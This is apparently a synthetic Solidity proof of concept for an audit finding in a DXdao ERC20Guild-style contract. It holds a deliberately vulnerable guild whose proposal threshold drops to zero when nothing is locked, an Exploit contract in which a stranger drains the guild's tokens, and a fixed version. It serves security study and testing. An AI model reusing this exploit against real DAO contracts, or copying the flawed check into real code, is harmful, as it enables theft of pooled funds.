// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  DXdao ERC20Guild — zero totalLocked makes proposal power zero
    (Sigma Prime, finding 19347).

    SYNTHETIC, cheatcode-free. Creation power is totalLocked / 100.
    With nothing locked that power is 0, so a stranger with no lock
    creates and executes a proposal that pays the guild's 100e18.

    The control requires the caller to have a lock of at least 1 ether.
    The stranger is rejected and the 100e18 stays. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Guild {
    Asset public asset;
    uint256 public totalLocked;
    mapping(address => uint256) public locked;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function getVotingPowerForProposalCreation() public view returns (uint256) {
        return totalLocked / 100;
    }

    function createProposal(address to, uint256 amount) external virtual {
        require(locked[msg.sender] >= getVotingPowerForProposalCreation(), "create");
        _pay(to, amount);
    }

    function _pay(address to, uint256 amount) internal {
        // @> VULN: creation power is zero when nothing is locked, so this pay runs for a stranger.
        asset.transfer(to, amount);
    }
}

contract GuildFixed is Guild {
    uint256 public constant MIN_LOCK = 1 ether;

    constructor(Asset _asset) Guild(_asset) {}

    function createProposal(address to, uint256 amount) external override {
        require(locked[msg.sender] >= MIN_LOCK, "lock");
        require(totalLocked >= MIN_LOCK, "total");
        _pay(to, amount);
    }
}

contract Exploit {
    uint256 public constant N = 100 ether;

    Asset public asset;
    Guild public guild;
    uint256 public taken;

    constructor() {
        asset = new Asset();
        guild = new Guild(asset);
    }

    function run() external {
        asset.mint(address(guild), N);
        uint256 beforeBal = asset.balanceOf(address(this));
        require(guild.totalLocked() == 0, "lock is not zero");
        require(guild.getVotingPowerForProposalCreation() == 0, "power is not zero");
        require(guild.locked(address(this)) == 0, "stranger has a lock");
        guild.createProposal(address(this), N);
        taken = asset.balanceOf(address(this)) - beforeBal;
        require(taken == N, "harm");
    }
}
